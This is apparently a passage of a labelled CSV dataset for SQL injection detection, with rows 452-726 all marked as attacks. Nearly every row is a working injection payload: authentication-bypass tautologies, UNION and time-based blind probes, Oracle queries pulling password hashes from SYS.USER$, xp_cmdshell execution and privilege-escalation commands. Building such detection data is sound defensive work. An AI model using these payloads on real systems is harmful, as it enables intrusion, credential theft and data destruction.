,Sentence,Label
452," select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'",1
453," select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1",1
454,"admin""or 1 = 1 or """" = """,1
455,uni/**/on sel/**/ect,1
456,""" or """"&""",1
457,  )  )  ;waitfor delay '0:0:__TIME__'--,1
458," select * from users where id = 1 or ""?;"" or 1 = 1 -- 1",1
459,1 waitfor delay '0:0:10'--,1
460,bfilename,1
461,admin' )  or  ( '1' = '1'--,1
462,UEf,1
463,' -- &password = ,1
464,1 or sleep ( __TIME__ ) #,1
465,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
466,or 1 = 1--,1
467," select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
468," select * from users where id = '1' + @ ( 1 )  union select 1,version (  )  -- 1'",1
469,' or 1 = 1-- ,1
470,1' and 1 =  ( select count ( * )  from tablenames ) ; --,1
471, or sleep ( __TIME__ ) #,1
472,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
473," select * from users where id = 1 or 1#"", = 1 or 1 = 1 -- 1",1
474,||6,1
475, or 1/*,1
476,"' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;",1
477, select * from users where id = 1.%@ or 1 = 1 -- 1,1
478," select * from users where id = 1 or "".."" = 1 or 1 = 1 -- 1",1
479," select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1",1
480," select * from users where id = 1 or "";]"" or 1 = 1 -- 1",1
481," or 1 = 1 or """" = ",1
482,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND 'i' = 'i",1
483, select * from users where id = 1 or $<\. or 1 = 1 -- 1,1
484," select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
485, or 'whatever' in  ( 'whatever' ) ,1
486,declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) ,1
487, select * from users where id = '1'   or 1 = 1 -- 1',1
488,?,1
489,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( table_name  )  )   FROM sys.all_tables  )  )   AND 'i' = 'i,1
490," select * from users where id = '1' union select @ 1,version (  )  --  1'",1
491,"admin"" )  or  ( ""1"" = ""1""#",1
492," select * from users where id = 1 or 1#"", union select 'a',version (  )  -- 1",1
493," select * from users where id = 1 or ""$ ( "" or 1 = 1 -- 1",1
494,' or '' ',1
495," select * from users where id = 1 or "";#"" or 1 = 1 -- 1",1
496, or 1 = 1,1
497,' ; drop table temp --,1
498,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
499,""" or benchmark ( 10000000,MD5 ( 1  )  )  #",1
500,""" or ""x"" = ""x",1
501, select * from users where id = '1'<@.. or 1 = 1 -- 1',1
502," select * from users where id = 1 or !<@ union select 1,version (  )  -- 1",1
503,' or 'something' like 'some%',1
504,'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --,1
505,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND 'i' = 'i",1
506, select * from users where id = '1' or \<\. or 1 = 1 -- 1',1
507,'; exec master..xp_cmdshell 'ping 10.10.1.2'--,1
508,admin' or '1' = '1'--,1
509,'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 1 )  waitfor delay '0:0:2' --,1
510,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
511," select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1",1
512," select * from users where id = 1 or 1#""$ union select null,version (  )  -- 1",1
513,""";waitfor delay '0:0:__TIME__'--",1
514,x' and userid is NULL; --,1
515, select * from users where id = '1' *$ 1 or 1 = 1 -- 1',1
516," select * from users where id = 1 or \<\ union select null,@@VERSION -- 1",1
517," select * from users where id = 1 or ""?@"" or 1 = 1 -- 1",1
518,’ or ‘1’ = ’1,1
519," select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'",1
520,admin'or 1 = 1 or '' = ',1
521," select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'",1
522," and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,11 ...",1
523,exec ( @s ) ,1
524," select * from users where id = 1 or ""_ ) "" or 1 = 1 -- 1",1
525," select * from users where id = 1 or \.<  = 1 union select 1,@@VERSION -- 1",1
526,' or 1 = 1,1
527, select * from users where id = 1 + $+%1 or 1 = 1 -- 1,1
528," select * from users where id = 1.  union select version (  ) ,version (  )  -- 1",1
529,x' AND email IS NULL; --,1
530," select * from users where id = '1' + @ @1 union select 1,version (  )  -- 1'",1
531,' -- ,1
532," select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'",1
533," select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1",1
534," select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1",1
535,update,1
536,' or 1/*,1
537," select * from users where id = 1.<1# union select 1,version (  )  -- 1",1
538,"""  )  )   or pg_sleep ( __TIME__ ) --",1
539,'||'6,1
540," select * from users where id = 1. <@ union select 1,version (  )  -- 1",1
541, or  ( EXISTS ) ,1
542,'^',1
543, or 'text'  =  n'text',1
544," select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
545," select * from users where id = '1' union select $ _,@@VERSION -- 1'",1
546," select * from users where id = 1 or "" ) ;"" or 1 = 1 -- 1",1
547," select * from users where id = 1 <@1$ union select 1,version (  )  -- 1",1
548,' or 0 = 0 --,1
549," select * from users where id = 1 or ""{1"" = 1 or 1 = 1 -- 1",1
550," select * from users where id = 1 or ""{,"" = 1 or 1 = 1 -- 1",1
551," select * from users where id = 1 or 1#"", union select version (  ) ,version (  )  -- 1",1
552," select * from users where id = 1 or 1#""? union select 'a',version (  )  -- 1",1
553,password:*/ = 1--,1
554," select * from users where id = 1 <@. union select 1,version (  )  -- 1",1
555," select * from users where id = 1 or "" ) @"" or 1 = 1 -- 1",1
556," select * from users where id = '1' union select @ @1,version (  )  --  1'",1
557,"' union  ( select NULL,  ( select @@version  )  )   --",1
558," select * from users where id = 1 or "" ) {"" or 1 = 1 -- 1",1
559," select * from users where id = 1.<@. union select 1,version (  )  -- 1",1
560," select * from users where id = 1 +\. union select null,@@VERSION -- 1",1
561,v,1
562," select * from users where id = 1 + @<@. union select 1,version (  )  -- 1",1
563," select * from users where id = 1 or \<$ union select 1,@@VERSION -- 1",1
564," select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1",1
565,os,1
566," select * from users where id = 1 +  ( \+ )  union select null,@@VERSION -- 1",1
567,hi or a = a,1
568," select * from users where id = 1. union select null,version (  )  -- 1",1
569," select * from users where id = 1 or "" ) ["" or 1 = 1 -- 1",1
570," select * from users where id = 1 or \.<1 union select 1,@@VERSION -- 1",1
571,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,1
572, select * from users where id = 1 <@$_ or 1 = 1 -- 1,1
573,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
574," select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1",1
575," select * from users where id = 1 or ""@%"" or 1 = 1 -- 1",1
576," select * from users where id = 1 or $<\ union select 1,@@VERSION -- 1",1
577,or 1 = 1,1
578," select * from users where id = 1 or ""%,"" or 1 = 1 -- 1",1
579, UNION SELECT,1
580,asc,1
581,"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1
582,"exec sp_addsrvrolemember 'name' , 'sysadmin'",1
583," select * from users where id = 1 or  ( \ )  = 1 union select 1,@@VERSION -- 1",1
584,' )  or true--,1
585," select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1",1
586,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
587,' or userid like '%,1
588,"' union  ( select NULL, NULL,  ( select @@version  )  )   --",1
589,/,1
590, select * from users where id = 1 or $<\ or 1 = 1 -- 1,1
591,"admin""/*",1
592," select * from users where id = 1.  union select 1,version (  )  -- 1",1
593,a',1
594, ) ;waitfor delay '0:0:__TIME__'--,1
595," select * from users where id = 1 union select @<@.,version (  )  -- 1",1
596," select * from users where id = 1 or ""._"" or 1 = 1 -- 1",1
597,"admin"" or ""1"" = ""1",1
598,' union  ( select @@version )  --,1
599,' or ''^',1
600,"""  )  )   or sleep ( __TIME__ )  = """,1
601,"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --",1
602,a,1
603," select * from users where id = 1 or \+<\ union select 1,@@VERSION -- 1",1
604," select * from users where id = 1 union select @ _,version (  )  -- 1",1
605, select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1,1
606, select * from users where id = '1' <@$_ or 1 = 1 -- 1',1
607," select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1",1
608," select * from users where id = 1 or "" ( &"" or 1 = 1 -- 1",1
609,"""hi"""" )  or  ( """"a"""" = """"a""",1
610, select name from syscolumns where id  =   ( sele ...,1
611," select * from users where id = 1 or ""1,"" or 1 = 1 -- 1",1
612,"'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay '0:0:2' --",1
613," select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
614,' or 2 between 1 and 3,1
615, union all select @@version--,1
616,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
617,t'exec master..xp_cmdshell 'nslookup www.google.com'--,1
618,""" or isNULL ( 1/0 )  /*",1
619," select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",1
620," select * from users where id = 1 or ""{?"" or 1 = 1 -- 1",1
621," select * from users where id = 1 or ""{#"" or 1 = 1 -- 1",1
622,declare @q nvarchar  ( 200 )  0x730065006c00650063 ...,1
623,' or 'a' = 'a,1
624,' union all select @@version--,1
625," select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1",1
626,"admin"" or 1 = 1/*",1
627,' or  ( EXISTS ) ,1
628," select * from users where id = 1<@<@ union select 1,version (  )  -- 1",1
629,declare @s varchar  ( 8000 )  select @s  =  0x73656c ...,1
630," select * from users where id = '1' union select +\#,@@VERSION -- 1'",1
631," select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1",1
632," select * from users where id = 1 or "".;"" or 1 = 1 -- 1",1
633," select * from users where id = 1 union select 1 1a,version (  )  -- 1",1
634,'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > ,1
635,"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --",1
636,hi' or 1 = 1 --,1
637,' UNION SELECT,1
638, select * from users where id = 1 % ( $ )  or 1 = 1 -- 1,1
639,â or 1 = 1 --,1
640," select * from users where id = 1 or 1#"" (  union select 'a',version (  )  -- 1",1
641," select * from users where id = 1 or ""{ ) "" or 1 = 1 -- 1",1
642," select * from users where id = 1 or ""1["" or 1 = 1 -- 1",1
643,desc,1
644," select * from users where id = 1 or "", ) "" = 1 or 1 = 1 -- 1",1
645,anything' or 'x' = 'x,1
646," select * from users where id = 1 or 1#""1 union select 1,version (  )  -- 1",1
647, select * from users where id = 1 + \+%\ or 1 = 1 -- 1,1
648,0x770061006900740066006F0072002000640065006C00 ...,1
649," select * from users where id = 1 -@<@ union select version (  ) ,version (  )  -- 1",1
650,grant connect to name; grant resource to name;,1
651," select * from users where id = '1' or $<\. union select 1,@@VERSION -- 1'",1
652," select * from users where id = 1 or ""]."" or 1 = 1 -- 1",1
653," select * from users where id = 1 or ""_;"" or 1 = 1 -- 1",1
654, or isNULL ( 1/0 )  /*,1
655,"insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ",1
656," select * from users where id = 1 or "" )  ( "" = 1 or 1 = 1 -- 1",1
657," select * from users where id = 1 or ""$@"" or 1 = 1 -- 1",1
658,"admin"" or ""1"" = ""1""#",1
659,"admin"" or 1 = 1--",1
660,' or user like '%,1
661,admin' )  or '1' = '1,1
662,""" or sleep ( __TIME__ ) #",1
663," select * from users where id = 1 or "" ) $"" or 1 = 1 -- 1",1
664," select * from users where id = 1 or ""?%"" or 1 = 1 -- 1",1
665, select * from users where id = '1' + $+%$ or 1 = 1 -- 1',1
666,' or ''-',1
667," select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
668,admin' )  or '1' = '1'/*,1
669,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND 'i' = 'i",1
670," select * from users where id = 1 or ""@?"" or 1 = 1 -- 1",1
671, select * from users where id = 1 <@$ or 1 = 1 -- 1,1
672,x' or 1 = 1 or 'x' = 'y,1
673,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
674," select * from users where id = 1 union select 1 $,version (  )  -- 1",1
675,' )  or  ( 'x' )  =  ( 'x,1
676, ( ,1
677," select * from users where id = 1 or 1#"" (  union select version (  ) ,version (  )  -- 1",1
678," select * from users where id = 1.%@ union select 1,version (  )  -- 1",1
679," select * from users where id = 1 +$+ union select null,@@VERSION -- 1",1
680," select * from users where id = '1' union select \.,@@VERSION -- 1'",1
681," select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1
682," select * from users where id = 1 +$+. union select null,@@VERSION -- 1",1
683," select * from users where id = 1 +1<@ union select null,version (  )  -- 1",1
684,  )  )   or sleep ( __TIME__ )  = ',1
685, having 1 = 1--,1
686,!,1
687, select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1,1
688,' or 'something'  =  'some'+'thing',1
689,' group by userid having 1 = 1--,1
690," select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1
691," select * from users where id = 1 or 1#""; union select 1,version (  )  -- 1",1
692,or 0 = 0 --,1
693,' or 0 = 0 #,1
694, or pg_sleep ( __TIME__ ) --,1
695, or '1' = '1'--,1
696, or a = a,1
697,28 %,1
698," select * from users where id = 1 or 1#""1 union select 'a',version (  )  -- 1",1
699," select * from users where id = 1 or 1#"". = 1 union select 1,version (  )  -- 1",1
700," select * from users where id = 1 or @#""{ = 1 union select 1,version (  )  -- 1",1
701,' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( USERNAME  )  )   FROM SYS.ALL_USERS  )  )   AND 'i' = 'i,1
702,sqlvuln,1
703," select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1
704," select * from users where id = 1 or 1#""; union select 'a',version (  )  -- 1",1
705,0x730065006c0065006300740020004000400076006500 ...,1
706," select * from users where id = 1 union select 1 1$,version (  )  -- 1",1
707," select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1",1
708, or 0 = 0 --,1
709,declare @s varchar  ( 8000 )  select @s  =  0x73656c65637420404076657273696f6e,1
710, select * from users where id = '1' or \<$ or 1 = 1 -- 1',1
711,' or ''&',1
712," select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1
713,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
714," select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1
715,' or username like char ( 37 ) ;,1
716," select * from users where id = 1 or 1#""$ union select version (  ) ,version (  )  -- 1",1
717, or 'something'  =  'some'+'thing',1
718,+sqlvuln,1
719, or 1 in  ( select @@version ) --,1
720,declare @q nvarchar  ( 4000 )  select @q  = ,1
721," select * from users where id = 1.&&@ union select 1,version (  )  -- 1",1
722,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND 'i' = 'i",1
723," select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1
724," select * from users where id = 1 + @<@# union select null,version (  )  -- 1",1
725," select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
726,"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
